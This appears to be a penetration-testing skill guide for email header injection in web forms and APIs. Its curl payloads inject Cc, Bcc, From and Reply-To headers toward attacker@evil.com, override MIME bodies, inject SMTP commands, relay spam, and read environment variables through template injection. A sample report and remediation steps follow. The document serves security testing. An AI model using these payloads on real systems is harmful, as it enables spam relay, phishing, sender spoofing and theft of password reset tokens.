---
name: testing-for-email-header-injection
description: Test web application email functionality for SMTP header injection vulnerabilities that allow attackers to inject additional email headers, modify recipients, and abuse contact forms for spam relay.
domain: cybersecurity
subdomain: web-application-security
tags: [email-injection, smtp-injection, crlf-injection, header-injection, spam-relay, contact-form, email-security]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Testing for Email Header Injection

## When to Use
- When testing contact forms, feedback forms, or "email a friend" functionality
- During assessment of password reset email functionality
- When testing newsletter subscription or notification email systems
- During penetration testing of applications that send emails based on user input
- When auditing email-related API endpoints for header injection

## Prerequisites
- Burp Suite for intercepting and modifying HTTP requests
- Understanding of SMTP protocol and email header structure
- Knowledge of CRLF injection techniques (\r\n sequences)
- Test email accounts for receiving injected emails
- Access to application features that trigger email sending
- SMTP server logs access for monitoring injection attempts

## Workflow

### Step 1 — Identify Email Injection Points
```bash
# Identify form fields that end up in email headers:
# - "From" name or email address fields
# - "To" or "CC" fields in sharing features
# - Subject line inputs
# - Reply-To fields

# Common endpoints:
# POST /contact - Contact forms
# POST /share - Share via email features
# POST /invite - Invitation systems
# POST /api/send-email - Email API endpoints
# POST /forgot-password - Password reset forms

# Test basic functionality first
curl -X POST http://target.com/contact \
  -d "name=Test&email=test@test.com&subject=Hello&message=Test message"
```

### Step 2 — Test for CRLF Header Injection
```bash
# Inject additional email headers via CRLF in the email field
curl -X POST http://target.com/contact \
  -d "name=Test&email=test@test.com%0ACc:attacker@evil.com&message=Test"

# Inject BCC header
curl -X POST http://target.com/contact \
  -d "name=Test&email=test@test.com%0ABcc:attacker@evil.com&message=Test"

# Inject via the name field
curl -X POST http://target.com/contact \
  -d "name=Test%0ACc:attacker@evil.com&email=test@test.com&message=Test"

# Inject via subject field
curl -X POST http://target.com/contact \
  -d "name=Test&email=test@test.com&subject=Hello%0ABcc:attacker@evil.com&message=Test"

# Try different CRLF encoding variants
# %0D%0A (CRLF)
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0D%0ACc:attacker@evil.com"

# %0A (LF only)
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0ACc:attacker@evil.com"

# %0D (CR only)
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0DCc:attacker@evil.com"

# Double encoding
curl -X POST http://target.com/contact \
  -d "email=test@test.com%250ACc:attacker@evil.com"
```

### Step 3 — Inject Custom Email Content
```bash
# Override email body by injecting Content-Type and body
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0AContent-Type:text/html%0A%0A<h1>Phishing</h1>"

# Inject additional MIME parts
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0AContent-Type:multipart/mixed;boundary=boundary123%0A--boundary123%0AContent-Type:text/html%0A%0A<script>alert(1)</script>"

# Override From header for email spoofing
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0AFrom:ceo@target.com"

# Inject Reply-To for phishing
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0AReply-To:attacker@evil.com"
```

### Step 4 — Test IMAP/SMTP Injection
```bash
# IMAP command injection via email field
curl -X POST http://target.com/webmail/search \
  -d "query=test%0AEXAMINE INBOX"

# SMTP command injection
curl -X POST http://target.com/api/send \
  -d "to=test@test.com%0ARCPT TO:attacker@evil.com"

# SMTP VRFY command injection
curl -X POST http://target.com/api/verify \
  -d "email=test@test.com%0AVRFY admin"

# Test SMTP relay abuse
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0ATo:victim1@target.com%0ATo:victim2@target.com%0ATo:victim3@target.com"
```

### Step 5 — Test JSON-Based Email APIs
```bash
# JSON API header injection
curl -X POST http://target.com/api/send-email \
  -H "Content-Type: application/json" \
  -d '{"to":"test@test.com\nCc:attacker@evil.com","subject":"Test","body":"Test"}'

# Array injection for multiple recipients
curl -X POST http://target.com/api/send-email \
  -H "Content-Type: application/json" \
  -d '{"to":["test@test.com","attacker@evil.com"],"subject":"Test","body":"Test"}'

# Template injection in email body
curl -X POST http://target.com/api/send-email \
  -H "Content-Type: application/json" \
  -d '{"to":"test@test.com","subject":"Test","body":"{{constructor.constructor(\"return process.env\")()}}"}'
```

### Step 6 — Validate Findings
```bash
# Check if injected CC/BCC emails were received
# Monitor attacker@evil.com inbox for received copies

# Verify header injection via email raw source
# In received email, check "View Original" or "Show Headers"
# Look for injected Cc:, Bcc:, From:, or Reply-To: headers

# Test if the application is usable as a spam relay
# by injecting multiple recipients in BCC

# Document the full injection chain
# 1. Injection point (which field)
# 2. Encoding required (CRLF, URL encoding)
# 3. Impact (spam relay, phishing, data theft)
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| CRLF Injection | Injecting carriage return and line feed characters to create new email headers |
| Header Injection | Adding unauthorized headers (Cc, Bcc, From) to outgoing emails |
| Spam Relay | Abusing email functionality to send spam to arbitrary recipients |
| Email Spoofing | Modifying From or Reply-To headers to impersonate trusted senders |
| MIME Manipulation | Injecting MIME boundaries to override email body content |
| SMTP Command Injection | Injecting raw SMTP commands through unsanitized email parameters |
| Newline Characters | \r\n (CRLF), \n (LF), \r (CR) used to separate email headers |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy for modifying email-related form submissions |
| swaks | Swiss Army Knife for SMTP testing and header injection validation |
| OWASP ZAP | Automated scanner with email injection detection |
| mailhog | Local SMTP testing server for capturing injected emails |
| smtp4dev | Development SMTP server for monitoring email injection results |
| Nuclei | Template scanner with email header injection detection templates |

## Common Scenarios

1. **Spam Relay** — Inject BCC headers to relay mass emails through the target's SMTP server, bypassing spam filters that trust the sender domain
2. **Phishing via Contact Form** — Modify From and Reply-To headers to send phishing emails appearing to originate from the target organization
3. **Password Reset Hijack** — Inject CC header in password reset flow to receive a copy of reset tokens sent to the victim
4. **Email Content Override** — Inject MIME Content-Type headers to replace legitimate email body with malicious phishing content
5. **Internal Email Abuse** — Use header injection to send emails to internal addresses not normally accessible through the application

## Output Format

```
## Email Header Injection Report
- **Target**: http://target.com/contact
- **Injection Point**: email field in contact form
- **Encoding Required**: URL-encoded LF (%0A)

### Findings
| # | Field | Payload | Result | Severity |
|---|-------|---------|--------|----------|
| 1 | email | test@test.com%0ACc:evil@evil.com | CC header injected | High |
| 2 | email | test@test.com%0ABcc:evil@evil.com | BCC header injected | High |
| 3 | name | Test%0AFrom:ceo@target.com | From spoofing | Medium |

### Remediation
- Validate email addresses with strict regex rejecting newline characters
- Strip \r, \n, and encoded variants from all email-related input
- Use parameterized email APIs that separate headers from data
- Implement rate limiting on email-sending functionality
```
